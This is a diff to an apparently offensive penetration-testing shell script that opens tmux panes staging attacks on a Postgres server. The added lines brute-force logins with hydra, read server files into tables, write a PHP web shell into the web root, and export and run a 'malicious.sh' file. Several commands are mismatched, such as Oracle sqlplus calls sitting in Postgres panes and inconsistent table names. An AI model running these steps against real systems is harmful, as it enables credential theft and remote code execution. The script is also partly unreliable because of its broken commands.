@@ -2713,6 +2713,34 @@ tmux send-keys -t PT:30.13 "printf \"\n# Mysql Reverse Shell: Activate meterpret
 tmux send-keys -t PT:30.13 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
 cd $folderProject
 
+cd $folderProjectAuthN
+# Postgres
+tmux new-window -t PT:31 -n '[5432] Postgres'
+tmux split-window -v -t PT:31.0
+tmux split-window -v -t PT:31.1
+tmux split-window -v -t PT:31.2
+tmux select-pane -t "31.2"
+tmux split-window -h -t "31.2"
+tmux split-window -h -t "31.2"
+tmux split-window -h -t "31.2"
+tmux split-window -v -t PT:31.6
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:31.0 "# Postgres: bruteforce attack" Enter
+tmux send-keys -t PT:31.0 "hydra -L users.txt -P passwords.txt $ip postgres && hydra -L users.txt -P pusers.txt $ip postgres && hydra -l '' -p '' $ip postgres && hydra -l 'dontknow' -p '' $ip postgres"
+tmux send-keys -t PT:31.1 "# Postgres: Access DB" Enter
+tmux send-keys -t PT:31.1 "psql -h $ip -p 5432 -U USER"
+tmux send-keys -t PT:31.2 "printf \"\n# Postgres: Information Exposure\n# select users and roles\n postgres# SELECT usename, usesysid, usecreatedb, usesuper, userepl FROM pg_user;\n\n\" " Enter
+tmux send-keys -t PT:31.2 "psql -h $ip -p 5432 -U USER"
+tmux send-keys -t PT:31.3 "printf \"\n# Postgres: Read file\n# Postgres: Read file: Create a temporary table\n postgres# CREATE TEMP TABLE passwd (content text);\n# Postgres: Read file: Copy /etc/file into table\n postgres# \copy dati(content) FROM '/tmp/dati.txt';\n\n\" " Enter
+tmux send-keys -t PT:31.3 "sqlplus USER/PASS@$ip:1521 as sysdba"
+tmux send-keys -t PT:31.4 "printf \"\n# Postgres: Write file\n# Postgres: Write file: create temporary table\n postgres# CREATE TEMP TABLE tmp_php (content text);\n postgres# INSERT INTO tmp_php (content) VALUES ('<?php system($_GET[\"cmd\"]); ?>');\n# Postgres: Write file: Save the file on filesystem\n postgres# \\\\COPY tmp_php TO '/var/www/html/shell.php';\n\n\" " Enter
+tmux send-keys -t PT:31.4 "sqlplus USER/PASS@$ip:1521 as sysdba"
+tmux send-keys -t PT:31.5 "printf \"\n# Postgres: Write file with io_export\n postgres# SELECT lo_export(1234, '/tmp/malicious.sh');\n postgres# COPY (SELECT pg_exec('chmod +x /tmp/malicious.sh && /tmp/malicious.sh')) TO '/dev/null';\n\n\" " Enter
+tmux send-keys -t PT:31.5 "sqlplus USER/PASS@$ip:1521 as sysdba"
+tmux send-keys -t PT:31.6 "printf \"\n# Postgres: Navigate DB\n# Get all databases\n postgres# list\n# Select all tables of a specific database\n postgres# \\\\\\c cozyhosting\n cozyhosting# \\\\\\dt\n# Select all data of a tables \n cozyhosting# select * from users;\n cozyhosting=# select * \"from users\";\n\n\" " Enter
+tmux send-keys -t PT:31.6 "sqlplus USER/PASS@$ip:1521 as sysdba"
+cd $folderProject
+
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
 ;;
